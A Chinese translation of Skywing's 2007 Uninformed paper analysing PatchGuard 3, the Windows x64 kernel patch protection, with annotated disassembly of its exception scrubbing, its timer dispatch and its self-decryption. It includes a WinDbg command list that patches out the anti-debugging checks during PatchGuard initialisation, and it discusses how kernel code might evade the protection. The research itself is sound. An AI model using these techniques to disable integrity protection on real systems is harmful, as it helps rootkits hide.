把这些要点放在心上，现在或许是时候重新评估一下：PatchGuard 以其当前的形态，是否真的值得微软为它投入这么多麻烦。迫使独立硬件供应商（IHV，Independent Hardware Vendor）和独立软件供应商（ISV，Independent Software Vendor）这个世界把他们内核模式代码中的烂摊子收拾干净，当然是一个合理的目标（而且是一个最终让所有 Windows 客户受益的目标，无论某些拥有编写拙劣的内核模式代码的公司 [8] 如何歪曲事实，都是如此），因为编写拙劣的内核模式代码，往最好里说会导致 Windows 常常与之联系在一起的那种长期不稳定，往最坏里说则会导致提权与任意代码执行漏洞。然而，对于 PatchGuard 所代表的东西，仍然存在重大的反面论点：事实上，它可能为恶意内核模式代码提供一种方便的办法，让其以一种非常难以检测的方式藏匿起来；而且，确实有真正的创新被 PatchGuard 给系统施加的限制所扼杀。作为后者的一个例子，请想一想：微软自家的 Virtual Server 2005 R2 SP1（Beta）就触犯了 PatchGuard，需要一个专门的内核热修复（hotfix）来改变 PatchGuard 究竟保护什么，才能在不以 PatchGuard 让其出名的那个臭名昭著的 CRITICAL_STRUCTURE_CORRUPTION 错误检查（bugcheck）让系统蓝屏的情况下运行 [3]。仅此一点就应当被视为一个指标，表明事实上确实存在对 PatchGuard 所阻止的某些技术的正当用途，尽管微软坚称情况并非如此。还应当指出的是，尽管微软声明不会为 PatchGuard 作任何例外 [1]，他们却不得不至少为自家代码在 PatchGuard 下运行而作过一次调整。你们当中的阴谋论者或许会想：鉴于微软曾明确作出相反的表态，当第三方软件有着与 Virtual Server 2005 R2 SP1 类似的需求、需要正当地使用被 PatchGuard 阻止的技术时，微软是否会如此宽宏大量，也为它们作出这样的豁免。

作为与 PatchGuard 目标相关的一条最后说明，即便 hypervisor 技术已经部署（而且更进一步，即便有所谓的由 hypervisor 实现的不可变内存（immutable memory）），对于保护驱动彼此不受侵害，能做的也很有限，因为即便在一个基于 hypervisor 的系统中（在那里内核本身受到保护、不受驱动侵害），相互依赖的驱动只要共存于同一个域中，就仍然能够相互干扰。在 Windows 中，这一点尤其成问题，因为设备栈（device stacks）和设备接口（device interfaces）这些概念允许驱动以多种方式彼此直接交互。要确保驱动不会转而互相修补（或者，在 hypervisor 正在对代码区域强制实行不可变内存的情况下，不去修改池分配（pool allocations）而不是修补代码），将会很困难。取决于一个试图绕过 PatchGuard 的第三方 ISV 的目标是什么，它或许可以简单地修补驱动（例如 Ntfs.sys 或 Tcpip.sys），来代替修补内核。从这个角度看，尽管有 PatchGuard 这类技术的努力，Windows 也不太可能成为这样一个环境：其中的内核模式驱动被完全隔离开来、无法相互干扰。

微软已经走上了一条道路，这条道路最终可能通向这样一个系统：有 bug 的驱动将无法让系统崩溃（也无法互相修补），这就是用户模式驱动框架（UMDF，User Mode Driver Framework，微软推出的让驱动运行在用户模式进程中、而非内核模式的驱动框架，目的是隔离故障驱动、提高系统稳定性）的出现。还有待观察的是，隔离的、基于用户模式的驱动是否会成为高性能设备（例如 PCI/PCI Express 设备，相对于 USB 设备而言）的一个可行替代方案，而不只是被局限于一台典型计算机出厂所带设备中的一小部分。作者预计，在任何可能的地方，微软都将试图把第三方代码移出敏感区域（例如内核），放进更受约束的位置（例如一个用户模式进程）。这与 PatchGuard 据称的目标是一致的：通过阻止第三方驱动执行可疑动作（或者至少，以一种可能让系统崩溃的方式执行可疑动作），来提高系统稳定性。

## 参考文献（Bibliography）

[1] Microsoft Corporation. Patching Policy for x64-Based Systems.
    http://www.microsoft.com/whdc/driver/kernel/64bitpatching.mspx;
    accessed December 10, 2006.

[2] skape, Skywing. Bypassing PatchGuard on Windows x64.
    http://uninformed.org/index.cgi?v=3&a=3&t=sumry;
    accessed December 10, 2006.

[3] Microsoft Corporation. Connect: Virtual Server 2005 R2 SP1 Beta.
    https://connect.microsoft.com/site/sitehome.aspx?SiteID=151;
    accessed December 28, 2006.

[4] Advanced Micro Devices, Inc. AMD 64-Bit Technology
    http://www.amd.com/us-en/assets/content_type/white_papers_and_tech_docs/x86-64_overview.pdf;
    accessed December 28, 2006.

[5] Microsoft Corporation. RtlVirtualUnwind.
    http://msdn2.microsoft.com/en-us/library/ms680617.aspx;
    accessed December 28, 2006.

[6] The PaX Team. Paging Based Non-Executable Pages.
    http://pax.grsecurity.net/docs/pageexec.txt;
    accessed December 30, 2006.

[7] Sherri Sparks and Jamie Butler. "SHADOW WALKER" Raising the Bar for Rootkit Detection.
    http://www.blackhat.com/presentations/bh-jp-05/bh-jp-05-sparks-butler.pdf;
    accessed December 30, 2006.

[8] Skywing. Anti-Virus Software Gone Wrong.
    http://www.uninformed.org/?v=4&a=4&t=sumry;
    accessed December 31, 2006.

## 附录四：原始论文全译三——PatchGuard Reloaded: A Brief Analysis of PatchGuard Version 3（Uninformed 第 8 卷，Skywing，2007）

## PatchGuard 重装上阵：PatchGuard 第 3 版简析
### PatchGuard Reloaded: A Brief Analysis of PatchGuard Version 3

作者：Skywing（skywing@valhallalegends.com，http://www.nynaeve.net/）
时间：2007 年 9 月

> **译者注**
> - 出处：Uninformed（安全技术刊）Vol 8，原文链接 http://www.uninformed.org/?v=8&a=5&t=txt 。
> - 背景：第 3 版随 Windows Server 2008 Beta 3 亮相，随后经 Windows Update 推向 Windows Vista / Windows Server 2003 x64——也就是说，它不是只随新系统发布，而是被当作一次更新直接送到了已装机用户的系统上。
> - 第 3 版相对第 2 版的变化点（全文主线）：① 随机出现第二个检查上下文（check context，指 PatchGuard 用来核对系统完整性的整套代码＋数据，含自解密检查例程）；② 用汇编写的第一道异常处理先清洗异常记录（过滤异常码、打乱被引用地址），堵住靠“访问违例引用 0xFFFFFFFFFFFFFFFF”识别 PatchGuard 的老办法；③ 新增不经 SEH 的启动路径（定时器 DPC 直接跳进自解密桩），SEH 不再是唯一的单点故障；④ 被借用的 DPC 例程在触发异常前先做随机层数的函数调用，打乱调用栈帧，让“固定上卷一层退出 DPC”失效；⑤ 受保护的内核变量集合扩大，封掉若干“与 PatchGuard 共存式绕过”的办法。文末作者又给了六类新的绕过思路及微软可能的反制。
> - 原文编号照录：原文在 3.4 节之后出现一个编号为“4.5”的“代码补丁支持”小节，之后才进入第 4 章，4.1–4.6 的编号在第 4 章内重新起算；正文里对它的回指也沿用原样，译文不擅自改号。
> - 代码、函数名、数值、反汇编一律保留原文；专有名词首次出现附中文说明。

### 摘要（Abstract）

自从针对内核补丁保护（Kernel Patch Protection，otherwise known as "PatchGuard"，下称 PatchGuard）的绕过或规避技术陆续发表以来，微软一直在持续打磨其补丁保护系统，试图封堵已知的绕过手法。随着 Windows Server 2008 Beta 3 的发布，以及随后经由 Windows Update 把 PatchGuard 全面分发到 Windows Vista / Windows Server 2003，微软把下一代 PatchGuard 推向了公众（“PatchGuard 3”）。与 PatchGuard 此前的历次更新一样，第 3 版代表的是一组渐进式的改动，旨在解决早期版本中被认为存在的弱点和已知的绕过向量。此外，PatchGuard 3 还扩大了受保护、禁止未经授权修改的内核变量集合，消除了若干可被用来在与 PatchGuard 共存（而非禁用它）的前提下规避 PatchGuard 的机制。本文描述 PatchGuard 3 中所做的部分改动。本文还提出若干可用于规避 PatchGuard 防御的新技术，并讨论针对这些技术的反制措施。

### 1) 引言（Introduction）

PatchGuard 是 Windows x64 版本中一项有争议的特性，起于 Windows Server 2003 x64 / Windows XP x64，并延续到 Windows Vista x64 与 Windows Server 2008 x64。PatchGuard 背后的设计目标，是阻止在 x86 版 Windows 上曾经极为普遍的那种对各种内核代码与数据结构的大肆挂钩（hooking，指在别人的执行路径上插入自己的代码）和修改。微软曾表示，内核崩溃的绝大多数是由第三方驱动造成的，作者使用 Windows 的经验也坚定地支持这一判断。由于访问内核内部数据结构、挂钩内核函数通常需要与系统其余部分做错综复杂的同步才能完全安全地完成，尤其是在多处理器机器上，许多执行这类危险任务的第三方驱动历史上都犯过极其严重的错误，往往导致系统稳定性受损或系统安全被攻破。后者在第三方程序挂钩系统调用等函数、却随后未能做充分的参数校验的情形下尤为常见。

微软对这一问题的解决办法，是除劝阻开发者做这类事情之外，还试图用技术手段强行阻止第三方代码对内核内部数据结构和代码做未经授权的修改。然而，由于 Windows 内核（及其配套驱动）的设计方式，内核模式驱动不可能运行在比内核本身更低的有效特权级上。这就给微软“阻止未经授权的内核补丁”这一目标出了难题：内核本身与第三方驱动之间不存在硬件强制的隔离。因此，第三方驱动可以随心所欲地操纵内核代码与数据。

尽管 TPM（可信平台模块）和硬件辅助虚拟化（hypervisor，虚拟机监控器）等新兴技术最终可能提供一种机制，在内核的某些关键部分与和它交互的第三方驱动之间部署一道硬件强制的边界，但就目前所涉技术（硬件与软件能力两方面）的现状而言，这样的做法对今天售出的大多数计算机并不能普遍适用。在缺少完整的、硬件强制的解决方案的情况下，微软转而采用其他办法来劝阻第三方软件做未经授权的内核修改。具体来说，由此产生的内核补丁保护机制（“PatchGuard”）改为建立在高度混淆的代码之上：这段代码虽然运行在与内核本身和第三方驱动相同的有效特权级上，却被设计成能抵御第三方驱动的检测和/或修改。这段代码负责定期检查关键内核代码与数据结构的完整性，一旦检测到这类修改，就把系统打崩。凭借这一事实——以前在 Windows x86 版本上可以肆意给内核打补丁、而试图做同样的操作在 x64 版 Windows 上会导致系统崩溃——第三方驱动实际上已被阻止在客户系统上部署的代码中大规模地做这类修改。

然而，像一切建立在“靠隐晦求安全”（security through obscurity）原则之上的系统一样，PatchGuard 有其固有的弱点。这些弱点可被第三方驱动利用，要么把 PatchGuard 整个禁用，要么在与 PatchGuard 平和共存的同时完全规避它的检查。微软完全清楚 PatchGuard 这一根本路数上的这些缺陷，于是转而周期性地更新 PatchGuard，以封堵已知的公开绕过技术。其净效果是：微软给任何敢违背其意愿、试图规避 PatchGuard 的独立软件供应商（ISV）营造了一种“移动靶”的印象。这有助于表明：任何为阻止或禁用 PatchGuard 而设计的代码，都可能在未来的某个时点失效，比如微软发布一次新的 PatchGuard 更新之时。这导致了一场小规模的军备竞赛：第三方编写规避 PatchGuard 的代码，微软则以开发并部署更新版 PatchGuard 作为回应，使新版不受这些绕过技术的影响。这个循环已经持续了几轮；事实上，PatchGuard 如今已以其第三个迭代版本部署到公众手中。

### 2) 保护方面的改进（Protection Improvements）

与 PatchGuard 2 相比，PatchGuard 3 实现了若干旨在保护 PatchGuard 自身、防止第三方代码将其禁用的渐进改进。对 PatchGuard 自卫逻辑的改动，大多看上去是对此前已发表的、公开已知的绕过技术的直接回应，而不是旨在让 PatchGuard 3 更能抵御分析与攻击的一般性改进。在这个意义上，虽然 PatchGuard 3（相对 PatchGuard 2）的这些改动能有效废掉作者所知的此前发表的大多数绕过机制，但要改动许多此前的攻击机制、使其对 PatchGuard 3 有效，也并非极其困难。PatchGuard 2 中实现的许多保护系统在 PatchGuard 3 中仍以某种形式存在，尽管其中一些已被改动以抵御此前发表的攻击。

本章将描述已做出的若干具体改进。

#### 2.1) 多个并发的 PatchGuard 检查上下文（Multiple Concurrent PatchGuard Check Contexts）

在以前的 PatchGuard 版本中，只存在一个 PatchGuard 检查上下文，它会被周期性地用来校验受保护区域的完整性。一些绕过技术依赖“只有一个 PatchGuard 上下文”这一事实：它们在定位到 PatchGuard 之后，禁用掉任何为“当场抓住 PatchGuard”所需要的侵入式内核补丁。PatchGuard 3 对此做了改进：如果 PatchGuard 被启用，它至少创建一个 PatchGuard 上下文，并有一定概率在系统启动时初始化第二个上下文。这一随机化依据处理器时间戳计数器（time stamp counter）做出，正如 PatchGuard 的其他一切随机化所做的那样。两个 PatchGuard 检查上下文——其中包括 PatchGuard 用来检查系统完整性的全部数据（含位于非分页池内存中的自解密检查例程）——在某次具体启动恰好使用两个上下文时，彼此完全独立地运行。

随机创建不止一个检查上下文有几项好处。首先，因为第二个上下文并不总是被创建，绕过技术的测试与开发过程（理论上）被引入了一个不确定因素：一个研究 PatchGuard 3 的人在第一眼时，可能注意不到还有机会创建出不止一个上下文。这可能导致调试过程中浪费时间，因为一些绕过技术会受活动上下文数量的影响。例如，作者为 PatchGuard 2 描述的原始绕过技术 [1]，在第一次出现 PatchGuard 被抓到的积极迹象之后，就有效地把自己关掉了（尽管在那个具体例子中，那些抓 PatchGuard 的钩子本可以事后继续留在原地）。

一个可能受这类方案影响的绕过技术的更好例子，是那些依赖在系统池内存中搜索 PatchGuard 迹象的技术。例如，一种理论上的绕过方案：主动在非分页池中定位 PatchGuard 上下文并以某种方式将其禁用（比如把自解密代码桩改写成展开为一条空操作函数），如果它没有被设计成在一次命中 PatchGuard 之后重新尝试一次池内存扫描，就可能在测试中随机地栽在这一招上。它还消除了这类内存扫描办法所能提供的确信程度：此前，如果一个人有办法在非分页池内存中定位 PatchGuard 上下文，那么他只要得到一次命中，就能确知 PatchGuard 事实上已被禁用（这可以被当作一个信号，表明现在可以安全地执行被 PatchGuard 阻止的动作了）。当多个检查上下文以一定概率运行时，绕过技术再也不可能采用“如果一个 PatchGuard 上下文已被定位并禁用，那么就可以安全地继续”这样的逻辑，因为野外存在的上下文数量可能不是恒定的。

#### 2.2) 过滤用于触发 PatchGuard 执行的异常码（Filtering of Exception Codes Used to Trigger PatchGuard Execution）

和 PatchGuard 2、以及它之前的 PatchGuard 1 一样，PatchGuard 的第三个迭代主要通过 DPC（Deferred Procedure Call，延迟过程调用）例程中的一个未处理异常来执行：经过一系列结构化异常处理程序（structured exception handlers）之后，最终（依据 DPC 的参数）调用位于非分页池内存中的自解密 PatchGuard 桩。这一做法暴露出一个隐患，这一点从此前 Uninformed 上发表的关于禁用 PatchGuard（第 2 版）的文章 [2] 可以得到印证。用 SEH（Structured Exception Handling，结构化异常处理）触发执行的问题在于：SEH 分发机制中有若干个点可以被外部调用者轻易修改，从而在异常被引发之后、但在已注册的异常处理程序本身被调用之前，就获得执行机会。

此前发表的技术利用了这一弱点：它们把自己安置在“被 PatchGuard 借用的 DPC 例程解引用一个精心构造的无效指针参数时引发的访问违例异常之后”，但在“响应这场访问违例异常、调用 PatchGuard 检查上下文的 SEH 逻辑之前”。具体来说，微软 C/C++ 编译器为所有编译器生成的 SEH 帧所使用的操作系统导出例程 _C_specific_handler，成了上述文章所述绕过尝试的目标。由于负责运行 PatchGuard 的 SEH 帧在 PatchGuard 第 1、2 版中看上去是用 C 写成的，在负责执行当前 PatchGuard 上下文所含 PatchGuard 完整性检查逻辑的用户提供的 SEH 逻辑之前，_C_specific_handler 会先被调用。到了这个点上，一种绕过技术只需中止 PatchGuard 检查例程的执行，并干净地把自己从调用栈中摘出、转移到一个已知良好的位置，就能禁用 PatchGuard。

然而，为使这种绕过机制正常工作，必须确保 _C_specific_handler 正在审查的那个具体异常事实上确实是 PatchGuard，而不是一个合法的内核模式异常。若把 PatchGuard 式的绕过用到后一情形上将是灾难性的，几乎可以肯定会在其后立刻导致系统崩溃或被破坏。有鉴于此，从异常分发器拦截点上正面识别出一个异常，是任何建立在异常分发器重定向之上的绕过技术的关键。而此前两个 PatchGuard 版本都把识别 PatchGuard 变成了小菜一碟。在这两例中，都是解引用一种特殊形式的无效地址——一个“非规范地址”（non-canonical address）——来触发那场最终导致 PatchGuard 检查上下文被执行的访问违例。非规范地址是指一个不落在现代 x64 处理器所呈现的 64 位地址空间子集之内的地址。

只要稍加审视 PatchGuard 的执行环境，使用非规范地址的优势就很清楚了。在 Windows 内核模式编程中，一般来说不可能盲目地解引用一个伪造的内核模式指针。这往往会引发一连串把系统打崩的事件，具体取决于被解引用的位置。非规范地址是这一规则的一个特殊的（未公开的）例外，因为处理器通过一般保护故障、而不是典型的缺页机制来报告这个异常。在这种情况下，操作系统把这个异常报告为一起与访问最高内核地址（0xFFFFFFFFFFFFFFFF）有关的访问违例。这一独特的签名可以被用来以相对安全的方式定位并禁用 PatchGuard，因为伪造的内核模式地址本不应该走到 SEH 分发这一步（在内核模式中），除非系统即将因一个致命的驱动或内核 bug 而崩溃（PatchGuard 是一个特例）。因此，此前可以通过寻找一场引用了 0xFFFFFFFFFFFFFFFF 的访问违例来正面识别 PatchGuard。

PatchGuard 3 在一定程度上改善了这种情况：在真正调用 PatchGuard 检查例程的、基于 _C_specific_handler 的逻辑被执行之前，先通过一个用汇编语言写成的异常处理程序（因此它不调用 _C_specific_handler）对异常数据做一些预过滤。具体来说，这个预过滤异常处理程序（其代码见下文）会把异常码改成一个随机值，该随机值与许多合法的内核模式异常重叠。例如，会用到一些适用于文件系统空间的状态码，诸如 STATUS_INSUFFICIENT_RESOURCES、STATUS_DISK_FULL、STATUS_CANT_WAIT。此外，异常地址也会被改动（在某些情况下甚至被设成指向一条指令的中间），被解引用的地址（访问违例的第二个异常参数）也被设为一个随机化的值。做完这些改动之后，这个汇编语言异常处理程序把控制权转交给基于 _C_specific_handler 的异常处理程序，由后者调用 PatchGuard。下面给出其中一个汇编语言预过滤异常处理程序的带注释反汇编：

```
;
; EXCEPTION_DISPOSITION
; KiCustomAccessHandler8 (
; /* rcx */ IN PEXCEPTION_RECORD               ExceptionRecord,
; /* rdx */ IN ULONG64                         EstablisherFrame,
; /* r8  */ IN OUT PCONTEXT                    ContextRecord,
; /* r9  */ IN OUT struct _DISPATCHER_CONTEXT* DispatcherContext
; );
KiCustomAccessHandler8 proc near
  test    [rcx+_EXCEPTION_RECORD.ExceptionFlags], 66h
loc_14009B4C7:
  jnz     short retpoint
  rdtsc
; Randomize ExceptionInformation[ 1 ]
; ( This is the "referenced address" for
;   an access violation exception.)
;
; ( Note that rax is not set to any
;   specific defined value in this
;   context.  It depends upon the value
;   that RtlpExecututeHandlerForException
;   and by extension RtlDispatchException
;   last set rax to. )
  mov     [rcx+(_EXCEPTION_RECORD.ExceptionInformation+8)], rax 
  xor     [rcx+(_EXCEPTION_RECORD.ExceptionInformation+8)], rdx
  shr     eax, 5
  and     eax, 70h
  sub     [r8+98h], rax
  and     edx, 7Fh
  or      edx, 0C0000000h
; Set ExceptionCode to a random value.  The code
; always has 0xC0000000 set, and the lowest byte
; is always masked with 7F.  This often results
; in an exception code that appears like a
; legitimate exception code.)
  mov     [rcx+_EXCEPTION_RECORD.ExceptionCode], edx 
  lea     rax, loc_14009B4C7+1
; Set ExceptionAddress to a bogus value.  In this case,
; it is set to in the middle of an instruction.  This
; may interfere with attempts to unwind successfully from
 the exception.
  mov     [rcx+_EXCEPTION_RECORD.ExceptionAddress], rax
; Set Context->Rip to the same
; bogus exception address value.
  mov     [r8+0F8h], rax  
  and     qword ptr [r8+88h], 0
retpoint:
  mov     eax, 1
  retn

KiCustomAccessHandler8 endp
```

（译注：上面代码块内的英文注释为原文自带，照录不译，以便与反汇编逐行对应。）

由于这个汇编语言异常例程把异常记录和上下文记录都“清洗”了一遍，此前那种靠寻找引用 0xFFFFFFFFFFFFFFFF 的访问违例、来把 PatchGuard 异常与众多合法内核模式异常区分开来的老办法，不再可行。换句话说，PatchGuard 试图大隐于市，藏在内核模式异常的正常背景噪声之中，而这类异常的绝大多数都存在于文件系统相关的代码里面。

#### 2.3) 不用 SEH 执行 PatchGuard（Executing PatchGuard Without SEH）

自 PatchGuard 诞生以来一直延续至今的一个反复出现的主题，是使用结构化异常处理来混淆对 PatchGuard 的调用。其意图是利用 x64 与 x86 之间 SEH 的诸多差异、以及反汇编器对 x64 SEH 支持的缺乏，使人难以理解调用 PatchGuard 时到底发生了什么。具有讽刺意味的是，把 x64 SEH 用作一种混淆机制，反而成了作者大量研究 [2] Windows x64 SEH 的催化剂。今天，作者认为，x64 异常处理如今已被公开记录到了与 x86 SEH 相当（甚至超过）的程度。

尽管 x64 SEH 起初作为一种混淆技术可能有用，但在 PatchGuard 2 发布之后，它显然已经上升为一个重大的隐患。这是因为 PatchGuard 与 SEH 相关的方面曾被多次成功地用于击败 PatchGuard。随着 PatchGuard 3 的到来，PatchGuard 的作者们抓住机会，在某种程度上使自己摆脱了 x64 SEH 已经变成的这一隐患。

PatchGuard 3 引入了一种特殊的运行模式，允许它在不使用 SEH 的情况下运作。这是就 PatchGuard 传统运作方式而言的一项重大改变（和改进）。它消除了异常分发路径上的一大类单点故障——这条路径在第三方驱动于控制权转移到真正的异常处理程序之前拦截 SEH 分发方面，特别容易受到外部干扰。PatchGuard 3 的无 SEH 模式的运作方式是：把一小段代码拷贝到非分页池内存中（作为一个 PatchGuard 上下文块的一部分）。随后，一个定时器对象的 DeferredRoutine（延迟例程，即 DPC 函数指针）引用位于该非分页池位置的这段代码。定时器对象所引用的代码，本质上是 PatchGuard 的任何一个被借用的 DPC 例程被调用时所发生事情的一个精简版：它设置一次对第一阶段自解密桩的调用，而该桩最终调用系统检查例程。

通过完全消除 SEH 这一 PatchGuard 的启动向量，许多依赖于能在 SEH 分发代码路径上抓到 PatchGuard 的绕过技术被彻底废掉。作为软件保护系统中纵深防御的一个例子，旧的、基于 SEH 的系统仍然被保留了下来（并带有前面提到的那些改动），这样一来，一个潜在的攻击者现在就必须同时对付多个彼此隔离的启动向量，才能阻止 PatchGuard 执行。下面给出被拷贝到非分页池并在不经 SEH 的情况下被调用的那个直接调用例程的带注释反汇编：

```
KiTimerDispatch proc near
  pushf
  sub     rsp, 20h
  mov     eax, [rsp+28h+var_8]
  xor     r9d, r9d
  xor     r8d, r8d
  mov     [rsp+28h+arg_0], rax
; [rcx+40] -> PatchGuard Decryption Key
  mov     rax, [rcx+40h] 
  mov     rcx, 0FFFFF80000000000h
  xor     rax, rdx
; Form a valid address for the PatchGuard context block by
; xoring the decryption key with the DeferredContext
; argument.
  or      rax, rcx
; Set the initial code for the stage 1 self-decrypting stub.
  mov     rcx, 8513148113148F0h 
  mov     rdx, [rax]
  mov     dword ptr [rax], 113148F0h
  xor     rdx, rcx
  mov     rcx, rax
; Call the stage 1 self-decrypting stub.
  call    rax
  add     rsp, 20h
  pop     rcx
  retn
KiTimerDispatch endp
```

（译注：上面代码块内的英文注释为原文自带，照录不译。）

#### 2.4) 被借用的 DPC 例程异常路径中随机的调用帧（Randomized Call Frames in Repurposed DPC Routine Exception Paths）

为 PatchGuard 2 提出的一个绕过向量是：在 _C_specific_handler 处拦截执行，检测出 PatchGuard，然后在 PatchGuard DPC 的返回点处（即在定时器或 DPC 分发器内部）恢复执行。由于 Windows x64 上存在广泛的展开（unwind）元数据，再加上一个被 PatchGuard 借用的 DPC 并不做任何有用的工作（除了调用 PatchGuard 之外），并且对其任何输出参数或返回值都没有有意义的影响，这件事做起来非常容易。

为了抵消这一弱点，PatchGuard 3 引入了这样一个做法：当一个被借用的 DPC 被调用时，在任何异常被触发之前，先做随机次数的函数调用。把调用帧栈这样随机化的意图，是废掉“总是上卷一层以实现从所涉 DPC 例程返回”这一办法。因为在异常被引发的点与 PatchGuard DPC 例程的起始之间存在随机数量的调用帧，而且 PatchGuard DPC 例程又不是导出的，所以从 SEH 分发代码路径的任何位置安全地返回出一个 PatchGuard DPC 例程就变得更加困难了。

下面给出调用帧随机化代码的一个例子（在这个例子中，ecx 被初始化为一个小的随机数，表示要做的调用次数）。存在若干个形式为 KiCustomRecurseRoutineN 的例程，其中 N 为 [0..9]，每一个都是相同的。

```
KiCustomRecurseRoutine4 proc near
  sub     rsp, 28h
  dec     ecx
  jz      short retpoint
  call    KiCustomRecurseRoutine5
retpoint: 
  mov     eax, [rdx]
  add     rsp, 28h
  retn
KiCustomRecurseRoutine4 endp
```

尽管展开仍然可以进行，但攻击者需要能够定位 PatchGuard DPC 例程真正的返回地址，这可能涉及把那些伪造的 KiCustomRecurseRoutine 调用与真正进入 DPC 例程本身的那次调用区分开来。

### 3) 额外的保护机制（Additional Protection Mechanisms）

PatchGuard 3 与 PatchGuard 2 共有一些此前未曾被描述过的额外保护机制。本章包括对这些保护机制的描述。

#### 3.1) 定时器列表混淆（Timer List Obfuscation）

PatchGuard 2 与 PatchGuard 3 采用了一种混淆方案，用来混淆定时器列表中的定时器与 DPC 对象指针。这一混淆方案围绕两个特殊的内核变量打转：KiWaitAlways 与 KiWaitNever，它们代表两个在启动时计算出来的随机混淆密钥。这些混淆密钥被用来编码各种指针（比如位于内核定时器列表中的一个 KTIMER 对象里指向 DPC 对象的链接），这些指针旨在受到保护、免于外部干扰。例如，当一个定时器 DPC 将在到期时被执行，下面这个算法被用来解码 KTIMER 对象中的 KDPC 链接：

```
ULONGLONG Deobfuscated;
PKDPC     RealDpc;

Deobfuscated = Timer->Dpc ^ KiWaitNever;
Deobfuscated = _rotl64(Deobfuscated, (UCHAR)KiWaitNever);
Deobfuscated = Deobfuscated ^ Timer;
Deobfuscated = _byteswap_uint64(Deobfuscated);
Deobfuscated = Deobfuscated ^ KiWaitAlways;

RealDpc      = (PKDPC)Deobfuscated;
```

凭借这两个变量是非导出内核变量这一点，这样一套方案的初衷，是让第三方驱动难于轻易干扰定时器列表或某些其他受保护的指针。然而，这个算法本身一旦有人定位到引用它的代码（比如内核中几乎任何与定时器相关的代码），就相当容易理解，这样一来，要保护“定时器列表到 DPC 对象的混淆”，剩下唯一的保护就只是在运行时侦测出 KiWaitAlways 与 KiWaitNever 的值了。

具有讽刺意味的是，内核调试器扩展 !kdexts.timer 实现了这个解码算法（在 kdexts!KiDecodePointer 中），以便在调用定时器显示命令时能向用户呈现一个有效的定时器列表。因为内核调试器可以访问内核的 PDB 符号，它可以毫不费力地定位 KiWaitAlways 与 KiWaitNever。

#### 3.2) PatchGuard 初始化时的反调试代码（Anti-Debugging Code at PatchGuard Initialization Time）

与 PatchGuard 2 一样，PatchGuard 3 在运行时包含了相当数量的反调试代码，旨在挫败用调试器单步跟踪 PatchGuard 初始化例程的企图。这类代码大多基于这样的做法：在 PatchGuard 初始化例程执行期间检查是否存在调试器（这种情况通常不应该发生，因为 PatchGuard 初始化例程只有在没有附加调试器时才会被调用），如果检测到了调试器，就禁用中断并进入一个自旋循环，从而不可恢复地冻结系统。

尽管这些反调试代码乍看之下可能令人生畏，但禁用它们不过是定位 PatchGuard 初始化例程内对 KdDebuggerNotPresent 的所有引用，并把那些对调试器的检查补丁掉。例如，作者在初始化时在调试器中使用了下面这组命令，来禁用针对 Windows Vista x64 SP0、内核版本 6.0.6000.16514 的反调试检查：

```
bp nt!KeInitAmd64SpecificState + 12 "r @edx = 1 ; r @eax = 1 ; g"
bp nt!KiFilterFiberContext
eb nt!KiFilterFiberContext+0x20 eb
eb nt!KiFilterFiberContext+0x19a eb

eb fffff800`01c63d22 eb
eb fffff800`01c64686 eb
eb fffff800`01c652be eb
eb fffff800`01c65334 eb
eb fffff800`01c65880 eb
eb fffff800`01c65a65 eb
eb fffff800`01c67479 eb
eb fffff800`01c68798 eb
eb fffff800`01c6a940 eb
eb fffff800`01c6b7a9 90 90
eb fffff800`01c6b7dd eb
eb fffff800`01c6bad9 eb
eb fffff800`01c6d0e7 eb
eb fffff800`01c6d2f6 eb
eb fffff800`01c6d650 eb
eb fffff800`01c65c3a 90 90 90 90 90 90
eb fffff800`01c690b1 90 90 90 90 90 90
```

#### 3.3) KeBugCheckEx 保护（KeBugCheckEx Protection）

为 PatchGuard 1 提出的最早的绕过机制之一，是挂钩负责让系统蓝屏的代码 [4]。从那里出发，攻击者只需恢复系统的正常执行即可。

有若干防御机制来防止这一点。在当前版本的 PatchGuard 中，线程栈的全部内容被填满零，使得恢复负责调用进入 PatchGuard 的那个线程的执行变得困难。此外，PatchGuard 似乎在系统初始化时做了一份 KeBugCheckEx 的拷贝，并在运行时、在通过一次 bug check（蓝屏检查）把系统打崩之前，紧接着把这个版本拷贝覆盖到内核中实际驻留的代码之上。这一点可以这样清楚地看到：在进入 PatchGuard 检查上下文的同时，在调试器中对 KeBugCheckEx 做一处修改，然后在 PatchGuard 上下文的内部函数上设置一个断点，以便在清掉栈和所有寄存器之后调用 KeBugCheckEx。如果这时再去检查 KeBugCheckEx，所做过的任何修改都已经消失了。

此外，PatchGuard 似乎在调用 KeBugCheckEx 之前禁用了 DbgPrint（把它用一条 "ret" 操作码补丁掉）。这可能是（一次失败的）企图：防止在不实际给 KeBugCheckEx 本身打补丁的情况下轻易获得在 KeBugCheckEx 内的执行机会，而给 KeBugCheckEx 本身打补丁则会规避前面提到的对蓝屏代码本身所做修改的保护。（KeBugCheckEx 通常利用 DbgPrintEx 在一次蓝屏发生时向调试器显示一条横幅。然而，因为 PatchGuard 只补丁了 DbgPrint，蓝屏最终发生时到底会发生什么，从结果上看几乎没有影响。）

这段代码可以在 PatchGuard 检查例程中、在调用 KeBugCheckEx 包装函数之前看到。指向 DbgPrint 的指针是在启动时 PatchGuard 初始化期间确定的。

```
mov     rax, [rbx+PATCHGUARD_CONTEXT.DbgPrint]
mov     byte ptr [rax], 0C3h ; '+' ; ret
```

#### 3.4) 两阶段代码去混淆（Two-Stage Code Deobfuscation）

PatchGuard 2 与 PatchGuard 3 更有趣的一个防御特性，是它混淆 PatchGuard 检查上下文——即校验系统完整性所必需的代码与数据——的机制。PatchGuard 上下文被混淆成这样：它们在不活动时在内存中是完全随机化的，并且每次该上下文被调用来检查系统完整性时，它的位置和混淆密钥（以及因此其内容）都会改变。

PatchGuard 的解密阶段被分成两个阶段。第一阶段本质上是一个小小的桩，它在内存中保持完全混淆状态，直到即将被调用之前。调用者会覆盖这个桩中被调用的第一条指令，把它改写成一条 "lock xor qword ptr [rcx], rdx" 指令。这个桩的参数是桩自身的地址（在 rcx 中）和解密密钥（在 rdx 中）。这样一来，第一条指令现在就修改了它自己（更重要的是，还修改了随后的那条指令，因为每条指令长 4 字节却修改 8 字节的操作码字节），其结果是变成另一条 xor 指令。这一小串 xor 指令就这样接续下去，直到解码桩的第二阶段被完全解码。

到这个点上，解码桩的第二阶段已是明文，现在可以执行了。第二阶段由一个 xor 运算的循环组成，它从 PatchGuard 上下文的末尾开始、向后移动，直到整个检查例程被解码。此外，在第二阶段解码过程中，每一轮 xor 时解密密钥都会被移位。

